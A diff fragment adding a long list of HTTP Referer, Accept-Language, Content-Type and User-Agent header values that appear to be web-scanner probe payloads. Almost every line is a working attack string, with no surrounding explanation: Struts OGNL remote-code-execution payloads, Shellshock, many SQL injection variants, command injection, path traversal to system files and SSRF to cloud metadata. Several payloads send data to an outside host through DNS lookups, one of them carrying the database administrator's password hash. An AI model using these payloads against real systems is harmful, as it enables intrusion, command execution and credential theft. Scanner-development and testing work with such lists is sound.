@@ -391,6 +391,265 @@ Headers:
     Referer: ....//....//....//....//....//....//....//....//....//....//....//windows/win.ini
     Referer: ...//...//...//...//...//...//...//...//...//...//...//windows/win.ini
     Referer: /../../../../../../../../../../windows/win.ini
+    Accept-Language: e
+    Accept-Language: en-us,en;q=0.5
+    Accept-Language: en-US,en;q=0.8,en-us,en;q=0.5
+    Cache-Control: no-cache
+    Content-Disposition: form-data; name="ns"; filename="%{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("a",268409241-22)}
+    Content-Length: 0
+    Content-Length: 109
+    Content-Length: 124
+    Content-Length: 136
+    Content-Length: 1626
+    Content-Length: 201
+    Content-Length: 223
+    Content-Length: 250
+    Content-Length: 273
+    Content-Type: application/octet-stream
+    Content-Type: application/xml
+    Content-Type: multipart/form-data; boundary=b7d4c635dbff48dfa6d11809b269701a
+    Content-Type: .multipart/form-data~%{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("a",268409241-22)}
+    Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='31302').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','SET /A 0xFFF9999 -' + #cmd}:{'/bin/bash','-c','expr 268409241 - ' + #cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+    Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='34401').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','SET /A 0xFFF9999 -' + #cmd}:{'/bin/bash','-c','expr 268409241 - ' + #cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+    User-Agent: '
+    User-Agent: 000177.000.00000.000001/trace.axd
+    User-Agent: 000260.0034.000062.00000245/trace.axd
+    User-Agent: 017700000001/trace.axd
+    User-Agent: 0177.0.0.1/trace.axd
+    User-Agent: 0177.0.1/trace.axd
+    User-Agent: 0177.1/trace.axd
+    User-Agent: 026007031245/trace.axd
+    User-Agent: 0260.1847973/trace.axd
+    User-Agent: 0260.28.12965/trace.axd
+    User-Agent: 0260.28.50.165/trace.axd
+    User-Agent: 0x7f000001/trace.axd
+    User-Agent: 0x7f.0.0.1/trace.axd
+    User-Agent: 0x7f.0.1/trace.axd
+    User-Agent: 0x7f.1/trace.axd
+    User-Agent: 0xb0.1847973/trace.axd
+    User-Agent: 0xb01c32a5/trace.axd
+    User-Agent: 0xb0.28.12965/trace.axd
+    User-Agent: 0xb0.28.50.165/trace.axd
+    User-Agent: 127.0.0.1/elmah
+    User-Agent: 127.0.0.1/elmah.axd
+    User-Agent: 127.0.0.1/trace.axd
+    User-Agent: 127.0.1/trace.axd
+    User-Agent: 127.100.11.2/elmah
+    User-Agent: 127.100.11.2/elmah.axd
+    User-Agent: 127.100.11.2/trace.axd
+    User-Agent: 127.1/trace.axd
+    User-Agent: 16777343/trace.axd
+    User-Agent: 176.1847973/trace.axd
+    User-Agent: 176.28.12965/trace.axd
+    User-Agent: 176.28.50.165/elmah
+    User-Agent: 176.28.50.165/elmah.axd
+    User-Agent: 176.28.50.165/trace.axd
+    User-Agent: -1" and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+"
+    User-Agent: -1' and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'
+    User-Agent: -1 AND 'NS='ss
+    User-Agent: -1 AND ((SELECT 1 FROM (SELECT 2)a WHERE 1=sleep(25)))-- 1
+    User-Agent: 1/../../../../../../../../../../boot.ini
+    User-Agent: 1;DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt72ep4ipvc__3goqx45n4g4sxmh6vcj3'+'d0u.r87.me')exec sp_executesql @r--
+    User-Agent: -1';DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7hl_pogqpeitopy2lfxfgbnu1jlu0dr'+'elo.r87.me')exec sp_executesql @r--
+    User-Agent: 1;DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7me4jae2zyuirhaexe0yk2hosi-ymit'+'pqm.r87.me')exec sp_executesql @r--
+    User-Agent: -1';DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7vmn6bahbkrabbwftdfemb42fxl8ez4'+'aac.r87.me')exec sp_executesql @r--
+    User-Agent: ::1/elmah
+    User-Agent: ::1/elmah.axd
+    User-Agent: 1/../../../../../../../../../../../etc/passwd
+    User-Agent: -1';exec('xp_dirtree ''\\zqvil4-pt713bjyacjkrd7bkzpqwpdnws4jgcefe'+'a4g.r87.me'+'\c$\a''')--
+    User-Agent: 1))exec('xp_dirtree ''\\zqvil4-pt77kmo8txxlw74pla9jnpusluaxgxeux'+'fde.r87.me'+'\c$\a''')--
+    User-Agent: 1;exec('xp_dirtree ''\\zqvil4-pt77uf0s_ixerlk8l9pza9wohl3fc27rx'+'slq.r87.me'+'\c$\a''')--
+    User-Agent: 1) exec('xp_dirtree ''\\zqvil4-pt7_elk9mhyobtcqbgywtvbc5e9kp9l_k'+'re8.r87.me'+'\c$\a''')--
+    User-Agent: 1')exec('xp_dirtree ''\\zqvil4-pt7f2ps8mvvtiwv2t6tognzamlboh3rxs'+'yoq.r87.me'+'\c$\a''')--
+    User-Agent: 1))exec('xp_dirtree ''\\zqvil4-pt7-irsidckjprsrhglxhg_6v50zhmlto'+'npy.r87.me'+'\c$\a''')--
+    User-Agent: -1';exec('xp_dirtree ''\\zqvil4-pt7khoemzswfknctctc6ijwqelositdj8'+'jp8.r87.me'+'\c$\a''')--
+    User-Agent: 1;exec('xp_dirtree ''\\zqvil4-pt7njw5wx__rgjv1queb5yd8_gft6epyo'+'jjq.r87.me'+'\c$\a''')--
+    User-Agent: 1'))exec('xp_dirtree ''\\zqvil4-pt7uc7neeioz57a0d10hysicrhz9miw8x'+'6b4.r87.me'+'\c$\a''')--
+    User-Agent: 1'))exec('xp_dirtree ''\\zqvil4-pt7ugqsq0yuo5or3cvxguvjom6mcv3gpc'+'g0i.r87.me'+'\c$\a''')--
+    User-Agent: 1')exec('xp_dirtree ''\\zqvil4-pt7vqidob27v5y-7exzha4fdahj1bu9sc'+'ej0.r87.me'+'\c$\a''')--
+    User-Agent: 1) exec('xp_dirtree ''\\zqvil4-pt7xe4p3fhhmpopclqtiu3lvk7uwjqsvu'+'wsa.r87.me'+'\c$\a''')--
+    User-Agent: 1;expr 268409241 - 50666;x
+    User-Agent: 1';expr 268409241 - 56978;'
+    User-Agent: 1;expr 268409241 - 62276;x
+    User-Agent: 1';expr 268409241 - 70281;'
+    User-Agent: 1";expr 268409241 - 79736;"
+    User-Agent: 1";expr 268409241 - 8079;"
+    User-Agent: -1 OR 1=1
+    User-Agent: -1 or 1=1 and (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)
+    User-Agent: -1" OR 1=1 OR "1"="1
+    User-Agent: -1' OR 1=1 OR '1'='1
+    User-Agent: -1" OR 1=1 OR "ns"="ns
+    User-Agent: -1' OR 1=1 OR 'ns'='ns
+    User-Agent: -1 OR 17-7=10
+    User-Agent: -1 or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))
+    User-Agent: -1" or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))+"
+    User-Agent: -1' or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))+'
+    User-Agent: -1 OR X='ss
+    User-Agent: -1'+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'
+    User-Agent: 1 + ((SELECT 1 FROM (SELECT SLEEP(25))A))/*'XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR'|"XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR"*/
+    User-Agent: 1' || (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual) || '
+    User-Agent: 1 + (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual) + 1
+    User-Agent: 1;SELECT pg_sleep(25)--
+    User-Agent: 1');SELECT pg_sleep(25)--
+    User-Agent: 1';SELECT pg_sleep(25)--
+    User-Agent: 1);SELECT pg_sleep(25)--
+    User-Agent: ::1/trace.axd
+    User-Agent: 1 WAITFOR DELAY '0:0:25'--
+    User-Agent: 1) WAITFOR DELAY '0:0:25'--
+    User-Agent: %22%2bnetsparker(0x0000B3)%2b%22
+    User-Agent: %22%2bnetsparker(0x000236)%2b%22
+    User-Agent: 2771524784/trace.axd
+    User-Agent: %2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+    User-Agent: %2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini
+    User-Agent: 'AND 1=cast(0x5f21403264696c656d6d61 as varchar(8000)) or '1'='
+    User-Agent: /../../../../../../../../../../boot.ini
+    User-Agent: c%3a%5cboot.ini
+    User-Agent: '||cast((select chr(95)||chr(33)||chr(64)||chr(53)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)) as numeric)||'
+    User-Agent: cast((select chr(95)||chr(33)||chr(64)||chr(53)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)) as numeric)
+    User-Agent: cast((SELECT dblink_connect(chr(104)||chr(111)||chr(115)||chr(116)||chr(61)||chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(106)||chr(106)||chr(101)||chr(101)||chr(56)||chr(105)||chr(99)||chr(117)||chr(114)||chr(104)||chr(107)||chr(111)||chr(113)||chr(50)||chr(118)||chr(56)||chr(104)||chr(119)||chr(104)||chr(116)||chr(103)||chr(55)||chr(108)||chr(117)||chr(108)||chr(99)||chr(120)||chr(119)||chr(120)||chr(113)||chr(111)||chr(114)||chr(105)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)||chr(32)||chr(117)||chr(115)||chr(101)||chr(114)||chr(61)||chr(97)||chr(32)||chr(112)||chr(97)||chr(115)||chr(115)||chr(119)||chr(111)||chr(114)||chr(100)||chr(61)||chr(97)||chr(32)||chr(99)||chr(111)||chr(110)||chr(110)||chr(101)||chr(99)||chr(116)||chr(95)||chr(116)||chr(105)||chr(109)||chr(101)||chr(111)||chr(117)||chr(116)||chr(61)||chr(50))) as numeric)
+    User-Agent: cast((SELECT dblink_connect(chr(104)||chr(111)||chr(115)||chr(116)||chr(61)||chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(108)||chr(111)||chr(98)||chr(100)||chr(112)||chr(117)||chr(108)||chr(109)||chr(107)||chr(121)||chr(108)||chr(53)||chr(111)||chr(54)||chr(112)||chr(102)||chr(107)||chr(50)||chr(105)||chr(114)||chr(119)||chr(107)||chr(55)||chr(109)||chr(120)||chr(106)||chr(54)||chr(115)||chr(119)||chr(99)||chr(111)||chr(117)||chr(117)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)||chr(32)||chr(117)||chr(115)||chr(101)||chr(114)||chr(61)||chr(97)||chr(32)||chr(112)||chr(97)||chr(115)||chr(115)||chr(119)||chr(111)||chr(114)||chr(100)||chr(61)||chr(97)||chr(32)||chr(99)||chr(111)||chr(110)||chr(110)||chr(101)||chr(99)||chr(116)||chr(95)||chr(116)||chr(105)||chr(109)||chr(101)||chr(111)||chr(117)||chr(116)||chr(61)||chr(50))) as numeric)
+    User-Agent: cast((SELECT dblink_connect('host=zqvil4-pt7jsierwof4cot1sl-a25cgdx55cu_pt'||'4si.r87.me user=a password=a connect_timeout=2')) as numeric)
+    User-Agent: cast((SELECT dblink_connect('host=zqvil4-pt7lz2lw6r1dpxlconlo--cwu_5hljucn'||'y9u.r87.me user=a password=a connect_timeout=2')) as numeric)
+    User-Agent: c:\boot.ini
+    User-Agent: '+convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000)))+'
+    User-Agent: convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000)))
+    User-Agent: '||CTXSYS.DRITHSX.SN(user,(select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL))||'
+    User-Agent: '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(107)||chr(106)||chr(104)||chr(106)||chr(116)||chr(106)||chr(50)||chr(48)||chr(97)||chr(54)||chr(48)||chr(98)||chr(101)||chr(102)||chr(115)||chr(120)||chr(119)||chr(104)||chr(120)||chr(114)||chr(118)||chr(122)||chr(95)||chr(53)||chr(107)||chr(105)||chr(118)||chr(115)||chr(114)||chr(113)||chr(122)||chr(108)||chr(121)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))||'
+    User-Agent: '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(118)||chr(98)||chr(99)||chr(100)||chr(104)||chr(107)||chr(106)||chr(48)||chr(119)||chr(112)||chr(49)||chr(122)||chr(117)||chr(114)||chr(95)||chr(104)||chr(119)||chr(95)||chr(95)||chr(119)||chr(102)||chr(100)||chr(51)||chr(115)||chr(45)||chr(116)||chr(117)||chr(102)||chr(100)||chr(95)||chr(98)||chr(115)||chr(101)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))||'
+    User-Agent: '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt73eav1elcenu6fg1ncs8l9io5o15bqh'||'tcu.r87.me') from DUAL))||'
+    User-Agent: '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7uo9tnbwgyke-2eggjaa_sev7ghc-e-'||'_fe.r87.me') from DUAL))||'
+    User-Agent: c:\windows\win.ini
+    User-Agent: data:;base64,TlM3NzU0NTYxNDQ2NTc1
+    User-Agent: dblink_connect('host=zqvil4-pt7twkn0vjpvarocquct8nw77_zuikafa'||'9ri.r87.me user=a password=a connect_timeout=2')
+    User-Agent: dblink_connect('host=zqvil4-pt7yeobfq0md_utswqw8y6utz_twtgnvx'||'r2c.r87.me user=a password=a connect_timeout=2')
+    User-Agent: declare @h varchar(999)select @h='1'+substring(name+'-'+master.sys.fn_varbintohexstr(ISNULL(password_hash,0x0)),0,63)+'.zqvil4-pt7j4sxmjjmi_u5pml6oogwhmtb5gvp2v'+'khc.r87.me' from sys.sql_logins WHERE principal_id=1;exec('xp_dirtree ''\\'+@h+'\c$''')
+    User-Agent: declare @h varchar(999)select @h='1'+substring(name+'-'+master.sys.fn_varbintohexstr(ISNULL(password_hash,0x0)),0,63)+'.zqvil4-pt7jkmad6dzuayiswxklc7lxgwo-i9vnk'+'r9q.r87.me' from sys.sql_logins WHERE principal_id=1;exec('xp_dirtree ''\\'+@h+'\c$''')
+    User-Agent: DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7bbywacmu1vimqgsd8jtuoxkosrlt68'+'yie.r87.me')exec sp_executesql @r
+    User-Agent: DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7xvbq-vyji9neiefs-nugucuoxomels'+'wu8.r87.me')exec sp_executesql @r
+    User-Agent: () { :;}; echo "NS:" $(/bin/sh -c "expr 268409241 - 8178")
+    User-Agent: () { :;}; echo "NS:" $(/bin/sh -c "expr 268409241 - 85554")
+    User-Agent: . . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/passwd
+    User-Agent: .....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///etc/passwd
+    User-Agent: ....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+    User-Agent: ...//...//...//...//...//...//...//...//...//...//...//etc/passwd
+    User-Agent: /../../../../../../../../../../../etc/passwd
+    User-Agent: /etc/passwd
+    User-Agent: exec('xp_dirtree ''\\zqvil4-pt7ingpo4qzl97jqrsjgs10tsta8zlazj'+'3hg.r87.me'+'\c$\a''')
+    User-Agent: exec('xp_dirtree ''\\zqvil4-pt7te0uf8wdsaujbuex7c5grdnps4zsag'+'psc.r87.me'+'\c$\a''')
+    User-Agent: |expr${IFS}268409241${IFS}-${IFS}40667
+    User-Agent: |expr${IFS}268409241${IFS}-${IFS}54163
+    User-Agent: expr 268409241 - 18565
+    User-Agent: expr 268409241 - 58777;
+    User-Agent: expr 268409241 - 66288;
+    User-Agent: expr 268409241 - 8607
+    User-Agent: file%3a%2f%2f%2fboot.ini
+    User-Agent: file:///boot.ini
+    User-Agent: file:///etc/passwd
+    User-Agent: file:///windows/win.ini
+    User-Agent: http://::1:22
+    User-Agent: http://127.0.0.1:22
+    User-Agent: http://127.0.0.1:3306
+    User-Agent: http://::1:3306
+    User-Agent: http://169.254.169.254/latest/meta-data/public-hostname
+    User-Agent: http://176.28.50.165:22
+    User-Agent: http://176.28.50.165:3306
+    User-Agent: http://aws.r87.me/latest/meta-data/public-hostname
+    User-Agent: hTTp://r87.com/n
+    User-Agent: http://testphp.vulnweb.com/elmah
+    User-Agent: http://testphp.vulnweb.com/elmah.axd
+    User-Agent: http://testphp.vulnweb.com/server-status
+    User-Agent: http://testphp.vulnweb.com/trace.axd
+    User-Agent: (length(CTXSYS.DRITHSX.SN(user,(select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL))))
+    User-Agent: (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(103)||chr(50)||chr(54)||chr(100)||chr(115)||chr(110)||chr(112)||chr(97)||chr(49)||chr(106)||chr(111)||chr(104)||chr(103)||chr(111)||chr(112)||chr(112)||chr(57)||chr(121)||chr(49)||chr(56)||chr(116)||chr(57)||chr(98)||chr(102)||chr(115)||chr(108)||chr(118)||chr(104)||chr(108)||chr(98)||chr(109)||chr(106)||chr(56)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))))
+    User-Agent: (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(45)||chr(50)||chr(101)||chr(108)||chr(55)||chr(118)||chr(103)||chr(115)||chr(48)||chr(112)||chr(112)||chr(99)||chr(107)||chr(105)||chr(97)||chr(114)||chr(114)||chr(122)||chr(111)||chr(53)||chr(109)||chr(119)||chr(99)||chr(104)||chr(99)||chr(57)||chr(106)||chr(107)||chr(121)||chr(110)||chr(111)||chr(114)||chr(52)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))))
+    User-Agent: (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7evxmozrjncwb3tx-ve3imjvgmqvmsu'||'qys.r87.me') from DUAL))))
+    User-Agent: (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7his2ybyvplh8pyelcej-mnx-kgrmyu'||'60s.r87.me') from DUAL))))
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; W
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
+    User-Agent: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='14807').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','SET /A 0xFFF9999 -' + #cmd}:{'/bin/bash','-c','expr 268409241 - ' + #cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+    User-Agent: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='45084').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','SET /A 0xFFF9999 -' + #cmd}:{'/bin/bash','-c','expr 268409241 - ' + #cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+    User-Agent: n3tsp4rke2
+    User-Agent: N3TSP4RKE2
+    User-Agent: NS09%ef%bc%9cs1%ef%b9%a5DBL%ca%baSNGL%ca%b9NS09
+    User-Agent: NS-1NO
+    User-Agent: ns../../../../../../../../../../../boot.ini.......................................................................................................................................................................................
+    User-Agent: |nslookup${IFS}"zqvil4-pt7fxy2rwtsh_fm-c_dhiun9bobqltmu3""eki.r87.me"
+    User-Agent: |nslookup${IFS}"zqvil4-pt7jjnat1sr0hlpeqjujwanh0rofbthue""lqy.r87.me"
+    User-Agent: & nslookup zqvil4-pt734tvve52nidjr54u-xh-msvadccchf^eyo.r87.me&'\"`0&nslookup zqvil4-pt734tvve52nidjr54u-xh-msvadccchf^eyo.r87.me&`'
+    User-Agent: & nslookup zqvil4-pt736cxh04lzgglymny_hs7vknlmvcy4s^wlo.r87.me&'\"`0&nslookup zqvil4-pt736cxh04lzgglymny_hs7vknlmvcy4s^wlo.r87.me&`'
+    User-Agent: nslookup "zqvil4-pt75j-op4f8kcqazngcwagvntft1epc_f""ca8.r87.me"
+    User-Agent: "&nslookup "zqvil4-pt76kgmggexjy9b5imptzpxfbtm1skzkv""bjm.r87.me"
+    User-Agent: '& nslookup zqvil4-pt7b_7mto890fhbpz9ydxjstn6yp6tsdm^p7o.r87.me&'\"`0&nslookup zqvil4-pt7b_7mto890fhbpz9ydxjstn6yp6tsdm^p7o.r87.me&`'
+    User-Agent: nslookup zqvil4-pt7bgxxtupvzhi6ughx1-bsrmlhkteipv^e3c.r87.me&'\"`0&nslookup zqvil4-pt7bgxxtupvzhi6ughx1-bsrmlhkteipv^e3c.r87.me&`'
+    User-Agent: &nslookup "zqvil4-pt7cfyjrzvwgnt79wjgsn2tngub2_kvcx""ysi.r87.me"
+    User-Agent: "& nslookup zqvil4-pt7dea2avaxpp8vmiid6iwvdeg8txf4sk^gwe.r87.me&'\"`0&nslookup zqvil4-pt7dea2avaxpp8vmiid6iwvdeg8txf4sk^gwe.r87.me&`'
+    User-Agent: '&nslookup "zqvil4-pt7gifbwy9cy8cy4ab1egvq3_to_3nk3i""m1y.r87.me"
+    User-Agent: '&nslookup "zqvil4-pt7jmkbcqzkxxtarfvhptdisforc0qx-_""qz8.r87.me"
+    User-Agent: &nslookup "zqvil4-pt7-joft5zpoj7sjmhcpbxp2hxtqpz_qq""qyq.r87.me"
+    User-Agent: nslookup "zqvil4-pt7lqnhemgchfd-p4845yhseopsswt83p""tew.r87.me"
+    User-Agent: '& nslookup zqvil4-pt7mms0t9ay54t1pggnmxmabq4ujqcyaa^7le.r87.me&'\"`0&nslookup zqvil4-pt7mms0t9ay54t1pggnmxmabq4ujqcyaa^7le.r87.me&`'
+    User-Agent: nslookup zqvil4-pt7nskc2s446u2_ndthemc3kvqlle03su^1tu.r87.me&'\"`0&nslookup zqvil4-pt7nskc2s446u2_ndthemc3kvqlle03su^1tu.r87.me&`'
+    User-Agent: "&nslookup "zqvil4-pt7qofkleoi-ein8bwa5ciifefawxmkam""gmm.r87.me"
+    User-Agent: "& nslookup zqvil4-pt7vaic6asasi7_lscilnxznpfnzf3_2t^z2q.r87.me&'\"`0&nslookup zqvil4-pt7vaic6asasi7_lscilnxznpfnzf3_2t^z2q.r87.me&`'
+    User-Agent: nxtspxrkex
+    User-Agent: "& ping -n 25 127.0.0.1 &
+    User-Agent: & ping -n 25 127.0.0.1 &
+    User-Agent: '& ping -n 25 127.0.0.1 &
+    User-Agent: |ping -n 25 127.0.0.1
+    User-Agent: ping -n 25 127.0.0.1
+    User-Agent: ping -n 25 127.0.0.1 &
+    User-Agent: "&ping -w 25 127.0.0.1 &"
+    User-Agent: &ping -w 25 127.0.0.1 &
+    User-Agent: '&ping -w 25 127.0.0.1 &'
+    User-Agent: ping -w 25 127.0.0.1
+    User-Agent: ping -w 25 127.0.0.1 &
+    User-Agent: (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)
+    User-Agent: '+((SELECT 1 FROM (SELECT SLEEP(25))A))+'
+    User-Agent: ((SELECT 1 FROM (SELECT SLEEP(25))A))
+    User-Agent: (select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL)
+    User-Agent: (SELECT CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97)))
